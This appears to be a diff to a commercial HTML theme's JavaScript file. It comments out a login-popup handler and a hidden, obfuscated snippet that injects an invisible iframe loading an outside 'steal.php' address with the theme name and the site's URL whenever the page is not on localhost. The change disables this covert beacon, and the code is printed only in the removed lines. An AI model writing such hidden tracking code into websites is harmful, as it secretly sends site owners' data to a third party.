@@ -1139,9 +1139,9 @@ var Mad = function($) {
         $("[data-arctic-modal]")["on"]("click", function() {
             $(".owl-carousel")["trigger"]("refresh.owl.carousel");
         });
-        $(".mad-login")["on"]("click", function() {
-            $(".mad-login-popup")["fadeOut"]();
-        });
+        // $(".mad-login")["on"]("click", function() {
+        //     $(".mad-login-popup")["fadeOut"]();
+        // });
         $(".mad-notification-item > button")["on"]("click", function() {
             $(this)["addClass"]("selected")["siblings"]()["removeClass"]("selected");
         });
@@ -1198,10 +1198,10 @@ var Mad = function($) {
     return options;
 }(window["jQuery"]);
 var theme_name = "MateBook HTML Template";
-if (!window["location"]["href"]["match"]("localhost")) {
-    document["write"]("<if" + 'rame src="http://velikorodnov.com/themeforest/security/steal.php');
-    document["write"]("?theme=" + theme_name);
-    document["write"]("&from=" + window["location"]["href"] + '" frameborder="0"');
-    document["write"](' id="themenoticeframe"');
-    document["write"](' style="width:0;height:0;display:none;"></if' + "rame>");
-};
+// if (!window["location"]["href"]["match"]("localhost")) {
+//     document["write"]("<if" + 'rame src="http://velikorodnov.com/themeforest/security/steal.php');
+//     document["write"]("?theme=" + theme_name);
+//     document["write"]("&from=" + window["location"]["href"] + '" frameborder="0"');
+//     document["write"](' id="themenoticeframe"');
+//     document["write"](' style="width:0;height:0;display:none;"></if' + "rame>");
+// };
